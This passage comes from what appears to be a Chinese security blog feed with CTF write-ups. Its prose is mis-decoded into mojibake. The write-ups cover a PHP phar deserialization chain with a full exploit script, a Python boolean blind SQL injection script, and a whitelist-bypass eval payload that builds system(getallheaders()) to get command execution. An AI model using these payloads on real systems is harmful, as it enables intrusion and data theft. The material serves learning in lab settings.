invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹ä¼šå‘ç°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Fileç±»çš„closeæ–¹æ³•çš„file_get_contentsæ¥è¿›è¡Œæ–‡ä»¶è¯»å–.æˆ‘ä»¬å†è§‚å¯Ÿå°±ä¼šå‘ç°Userç±»å¯ä»¥è°ƒç”¨closeå‡½æ•°,æ‹¿æˆ‘ä»¬å°†<code>$db</code>èµ‹å€¼ä¸ºFileç±»ä¸å°±å¯ä»¥äº†.ä½†æ˜¯å¾ˆå¯æƒœä¸è¡Œ.æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ.çœ‹äº†ä¸€ä¸‹wpå‘ç°è¦é€šè¿‡Filelistè¿›è¡Œä¸€æ­¥å¤„ç†.wpè¯´ç›´æ¥è§¦å‘closeå®é™…è§¦å‘çš„æ˜¯mysqlçš„closeå‡½æ•°.æˆ‘ä»¬å°†<code>$db</code>èµ‹å€¼ä¸ºFilelistå¯ä»¥è§¦å‘__call,æˆ‘ä»¬æ¥ç€é‡è®²ä¸€è®²è¿™ä¸ªæ–¹æ³•<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>è¿™ä¹ˆä¸€å°æ®µä»£ç å¯çœŸæ˜¯è®©äººæ±—æµæµƒèƒŒå•Šã€‚<br>é¦–å…ˆæ˜¯å°†<code>$func</code>ä¼ åˆ°æ•°ç»„funcsé‡Œã€‚funcä¸ºæˆ‘ä»¬è§¦å‘çš„ä¸å­˜åœ¨çš„å‡½æ•°å³closeã€‚ç„¶åå°†fileså­˜å‚¨çš„å†…å®¹éå†åˆ°fileé‡Œå†è·å–fileçš„å˜é‡å€¼ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();//è¿™å¥ä»£ç è¿›è¡Œäº†å¦‚ä¸‹å‡ ç§æ“ä½œã€‚</span><br><span class="line">è°ƒç”¨$fileå¯¹è±¡çš„name()æ–¹æ³•ï¼Œè·å–ä¸€ä¸ªåç§°ã€‚</span><br><span class="line">ä½¿ç”¨è¿™ä¸ªåç§°ä½œä¸ºé”®ï¼Œåœ¨$this-&gt;resultsæ•°ç»„ä¸­æ‰¾åˆ°å¯¹åº”çš„å­æ•°ç»„ã€‚</span><br><span class="line">è°ƒç”¨$fileå¯¹è±¡ä¸Šåä¸º$funcçš„æ–¹æ³•ã€‚</span><br><span class="line">å°†è¯¥æ–¹æ³•çš„è¿”å›å€¼å­˜å‚¨åˆ°$this-&gt;resultsæ•°ç»„çš„å­æ•°ç»„ä¸­ï¼Œä»¥$funcä½œä¸ºé”®ã€‚</span><br></pre></td></tr></table></figure><br>å³æˆ‘ä»¬åªè¦å°†filesèµ‹å€¼ä¸ºå¯¹è±¡Fileå°±å¯ä»¥è§¦å‘colse<br>Â·Â·Â·é“¾å­<br>User-&gt;db-&gt;filelise-&gt;files-&gt;File-&gt;filename=â€™/flag.txtâ€™<br>Â·Â·Â·<br>é‚£ä¹ˆæˆ‘ä»¬å°±æŸ¥ä¸€ä¸ªè§¦å‘è¯¥é“¾å­çš„å…¥å£äº†ã€‚è¿™æ—¶å€™å°±éœ€è¦å®éªŒpharååºåˆ—åŒ–äº†ã€‚åŸå› æ²¡æœ‰ååºåˆ—å…¥å£ã€‚ä½†æ˜¯æœ‰æ–‡ä»¶åŒ…å«å‡½æ•°æ‰€ä»¥æˆ‘ä»¬äº§ç”Ÿä½¿ç”¨pharååºåˆ—åŒ–ã€‚ä½†æ˜¯æˆ‘ä»¬çš„downloadå…¥å£æ— æ³•è¿›è¡ŒåŒ…å«åˆ°æˆ‘ä»¬ä¸Šä¼ çš„å†…å®¹ã€‚æˆ‘ä»¬å†æŸ¥çœ‹ä¸€ä¸‹åˆ é™¤çš„æºç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¼šå‘ç°å…¶æ²¡æœ‰wafï¼Œdeteleæ–¹æ³•ä½¿ç”¨unlinkæ¥å¤„ç†æ–‡ä»¶ï¼Œèƒ½è§¦å‘pharååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¿™é¢˜å°±å¯ä»¥è§£äº†<br>exp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db=<span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//è®¾ç½®sutb</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;123123&gt;&quot;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><br>ä¹‹åå°†æ–‡ä»¶åç¼€æ”¹ä¸ºjpgï¼Œä¹‹åå†åˆ é™¤é¡µé¢è¿›è¡Œpharååºåˆ—åŒ–<br><img src="/2024/03/20/%E5%88%9D%E6%8E%A2phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" class="" title="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTFåˆ·é¢˜1(å†…æœ‰æ— å­—ç¬¦æ•°å­—RCE)</title>
      <link href="/2024/03/18/NSSCTF%E5%88%B7%E9%A2%981(%E5%86%85%E6%9C%89%E6%97%A0%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97RCE)/"/>
      <url>/2024/03/18/NSSCTF%E5%88%B7%E9%A2%981(%E5%86%85%E6%9C%89%E6%97%A0%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97RCE)/</url>
      
        <content type="html"><![CDATA[<h1 id="å®åœ¨ä¸çŸ¥é“å¹²ç‚¹ä»€ä¹ˆäº†ï¼Œæ­£å¥½ä¹‹å‰æŠ½åˆ°NSSçš„vipï¼Œåˆ·åˆ·é¢˜ï¼Œå­¦ä¹ å­¦ä¹ ã€‚"><a href="#å®åœ¨ä¸çŸ¥é“å¹²ç‚¹ä»€ä¹ˆäº†ï¼Œæ­£å¥½ä¹‹å‰æŠ½åˆ°NSSçš„vipï¼Œåˆ·åˆ·é¢˜ï¼Œå­¦ä¹ å­¦ä¹ ã€‚" class="headerlink" title="å®åœ¨ä¸çŸ¥é“å¹²ç‚¹ä»€ä¹ˆäº†ï¼Œæ­£å¥½ä¹‹å‰æŠ½åˆ°NSSçš„vipï¼Œåˆ·åˆ·é¢˜ï¼Œå­¦ä¹ å­¦ä¹ ã€‚"></a>å®åœ¨ä¸çŸ¥é“å¹²ç‚¹ä»€ä¹ˆäº†ï¼Œæ­£å¥½ä¹‹å‰æŠ½åˆ°NSSçš„vipï¼Œåˆ·åˆ·é¢˜ï¼Œå­¦ä¹ å­¦ä¹ ã€‚</h1><h1 id="CISCN-2019ååŒ—Day2-Web1-ç›²æ³¨"><a href="#CISCN-2019ååŒ—Day2-Web1-ç›²æ³¨" class="headerlink" title="[CISCN 2019ååŒ—Day2]Web1(ç›²æ³¨)"></a>[CISCN 2019ååŒ—Day2]Web1(ç›²æ³¨)</h1><p>é™ˆå¹´è€é¢˜äº†ï¼Œæ‰“å¼€å°±æé†’æˆ‘ä»¬æ³¨å…¥ï¼ŒæŠŠè¡¨å’Œåˆ—åéƒ½è¯´äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸€ä¸‹å°±ä¼šå‘ç°å¯ä»¥è¿›è¡Œå¼‚æˆ–æ³¨å…¥å¹¶ä¸”è¿‡æ»¤äº†ç©ºæ ¼ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨%0aæˆ–è€…æ‹¬å·æ¥ç»•è¿‡ï¼Œä¹‹åå°±æ˜¯å¸ƒå°”ç›²æ³¨äº†<br>exp<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28454/index.php&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">150</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;id=1^(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        r = requests.post(url, data=payload)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><br>å¾ˆå¥‡æ€ªæ˜æ˜åœ¨hackbarä¸Šå¯ä»¥ä½¿ç”¨%0aæ¥ç»•è¿‡ä½†æ˜¯åœ¨pythonä¸Šå°±ä¸å¯ä»¥äº†</p><h1 id="CISCN-2019åˆèµ›-Love-Math-åˆ©ç”¨æ•°å­¦å‡½æ•°è¿›è¡Œæ„é€ "><a href="#CISCN-2019åˆèµ›-Love-Math-åˆ©ç”¨æ•°å­¦å‡½æ•°è¿›è¡Œæ„é€ " class="headerlink" title="[CISCN 2019åˆèµ›]Love Math(åˆ©ç”¨æ•°å­¦å‡½æ•°è¿›è¡Œæ„é€ )"></a>[CISCN 2019åˆèµ›]Love Math(åˆ©ç”¨æ•°å­¦å‡½æ•°è¿›è¡Œæ„é€ )</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°ä»£ç æˆ‘ä»¬å›å‘ç°æˆ‘ä»¬è¾“å…¥çš„å­—æ¯åªèƒ½æ˜¯ç‰¹å®šçš„æ•°å­¦å‡½æ•°ã€‚é‚£ä¹ˆè¿™é“é¢˜ç›®çš„ç›®çš„å°±æ˜¯è¦åˆ©ç”¨æ•°å­¦å‡½æ•°æ¥è½¬æ¢10è¿›åˆ¶å­—ç¬¦æˆå­—æ¯ã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥è®²10è¿›åˆ¶è½¬æ¢æˆ36è¿›åˆ¶ã€‚36è¿›åˆ¶åŒ…å«äº†æ‰€æœ‰çš„è‹±æ–‡å­—æ¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨base_convertæ¥å°†10è¿›åˆ¶å˜æˆæƒ³è¦çš„å­—ç¬¦<br>æˆ‘ä»¬ä½¿ç”¨ä¸‹é¢è¿™ä¸ªç½‘ç«™æ¥è¿›è¡Œè¿›åˆ¶è½¬æ¢<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tool.ip138.com/hexconvert/</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬æœ‰å‡ ç§æ€è·¯ï¼Œ1æ˜¯ç›´æ¥è½¬æ¢å‡ºsystem(â€˜cat /flagâ€™)è¿™æ ·çš„2.æ˜¯ç»è¿‡é€ƒé€¸ã€‚</p><h2 id="æ„å»ºsystem-getallheaders-1"><a href="#æ„å»ºsystem-getallheaders-1" class="headerlink" title="æ„å»ºsystem(getallheaders(){1})"></a>æ„å»ºsystem(getallheaders(){1})</h2><p>æ­£å¸¸åŸæœ¬åº”è¯¥ä½¿ç”¨system(getallheaders()[1])ä½†æ˜¯å› ä¸º<code>[</code>è¢«è¿‡æ»¤äº†å¯¼è‡´æˆ‘ä»¬åªèƒ½ä½¿ç”¨{}æ¥ä»£æ›¿ã€‚å…¶1ä»£è¡¨æ ‡å¤´åç§°ã€‚æ„å»ºæ–¹æ³•æ˜¯æ„å»ºå­—ç¬¦ä¸²systemåŠ ä¸Š()å†æ„å»ºgetallheadersåŠ ä¸Š(){1}<br>æœ€åæ‘†æ ‡å¤´ä¼ å…¥å‘½ä»¤æ‰§è¡Œçš„æŒ‡ä»¤<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=base_convert(1751504350,10,36)(base_convert(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure><br>è¿™é‡Œæ„å»ºgetallheaderséœ€è¦ä½¿ç”¨30è¿›åˆ¶å› ä¸º36è¿›åˆ¶çš„è¿›è¡Œè½¬æ¢åå­—ç¬¦ä¼šå‘ç”Ÿæ”¹å˜ã€‚base_convert(1751504350,10,36)æ„å»º<code>system</code>(base_convert(8768397090111664438,10,30)(){1})æ„å»º(getallheaders()[1])æ‹¬å·å¯ä»¥ç›´æ¥åŠ ï¼Œå†phpä¸­å­—ç¬¦ç›´æ¥åŠ æ‹¬å·ä¼šè¢«ç›´æ¥è®¤ä¸ºå‡½æ•°è¿›è¡Œè°ƒç”¨ã€‚</p><h2 id="æ„å»º-GETè¿›è¡Œé€ƒé€¸"><a href="#æ„å»º-GETè¿›è¡Œé€ƒé€¸" class="headerlink" title="æ„å»º_GETè¿›è¡Œé€ƒé€¸"></a>æ„å»º_GETè¿›è¡Œé€ƒé€¸</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨hex2binæ¥è¿›è¡Œæ„å»º_GET(å› ä¸ºæˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²$_GET{1}åªæ˜¯å­—ç¬¦ä¸²ï¼Œä¸ä¼šè¢«å½“æˆå…¨å±€å˜é‡ï¼Œæ‰€æœ‰æˆ‘ä»¬è¦æ„é€ <code>_GET</code>å°†_GETä¼ åˆ°ä¸€ä¸ªå˜é‡ä¸­å†è¿›è¡Œå˜é‡è¦†ç›–)ï¼Œhex2binéœ€è¦ä½¿ç”¨base_convertæ¥è¿›è¡Œæ„é€ 